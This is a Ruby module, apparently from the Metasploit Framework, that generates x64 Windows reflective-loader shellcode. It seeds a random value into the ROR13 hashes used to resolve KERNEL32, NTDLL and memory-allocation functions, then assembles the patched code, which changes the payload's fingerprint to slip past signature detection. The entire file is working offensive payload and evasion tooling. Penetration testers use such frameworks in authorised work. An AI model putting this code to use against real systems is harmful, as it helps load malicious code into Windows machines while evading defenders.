module Msf::Payload::Windows::ReflectiveLoaderX64

  def reflective_loader(opts = {})
    iv = opts.fetch(:iv) { rand(0x100000000) } & 0xFFFFFFFF

    reflective_loader_asm = Rex::Payloads::Shuffle.from_graphml_file(
      File.join(Msf::Config.install_root, 'data', 'shellcode', 'reflective_loader.x64.graphml'),
      arch: ARCH_X64,
      name: 'reflective_loader'
    )
    
    _patch_bytes = lambda { |asm, oldbytes, newbytes|
      unless asm.include?(oldbytes)
        raise "Failed to patch, opcode: #{oldbytes} not found."
      end
      asm.sub!(oldbytes, newbytes)
    }

    _to_hashbytes = lambda { |name, nullbyte: false, unicode: false, iv: 0|
        name = name.unpack('C*').pack('v*') if unicode
        fun_hash = Rex::Text.ror13_hash(name + (nullbyte ? "\x00" : ""), iv: iv) & 0xFFFFFFFF
        [fun_hash].pack('V').bytes.map { |b| "0x%02x" % b }.join(', ')
    }

    # Patching IV
    iv_bytes = [iv].pack('V').bytes.map { |b| "0x%02x" % b }.join(', ')
    reflective_loader_asm = _patch_bytes.call(reflective_loader_asm, "db 0x41, 0xbc, 0x00, 0x00, 0x00, 0x00", "db 0x41, 0xbc, #{iv_bytes}")
    reflective_loader_asm = _patch_bytes.call(reflective_loader_asm, "db 0xb8, 0x00, 0x00, 0x00, 0x00", "db 0xb8, #{iv_bytes}")

    vprint_status("Random IV: #{iv}")
    patches = [
      { :base => "db 0x41, 0x81, 0xfc,", name: 'KERNEL32.DLL', unicode: true },
      { :base => "db 0x41, 0x81, 0xfc,", name: 'NTDLL.DLL', unicode: true},
      { :base => "db 0x3d,", name: 'LoadLibraryA', count: 2},
      { :base => "db 0x3d,", name: 'GetProcAddress'},
      { :base => "db 0x3d,", name: 'ZwAllocateVirtualMemory', count: 2},
      { :base => "db 0x3d,", name: 'ZwProtectVirtualMemory'},
      { :base => "db 0x3d,", name: 'NtFlushInstructionCache', count: 2},
    ]

    patches.each { |patch|
      count = patch.fetch(:count) { 1 }
      old_hash = _to_hashbytes.call(patch[:name], unicode: patch[:unicode], iv: 0)
      new_hash = _to_hashbytes.call(patch[:name], unicode: patch[:unicode], iv: iv)
      count.times do
        vprint_status("Applying patch from #{old_hash} to #{new_hash} for #{patch[:name]}")
        reflective_loader_asm = _patch_bytes.call(reflective_loader_asm, "#{patch[:base]} #{old_hash}", "#{patch[:base]} #{new_hash}")
      end
    }
    code = Metasm::Shellcode.assemble(Metasm::X64.new, reflective_loader_asm).encode_string
    hash = Rex::Text.md5_raw(code).unpack("H*").first
    vprint_status("Reflective Loader GraphML fingerprint: #{hash}")
    code
  end
end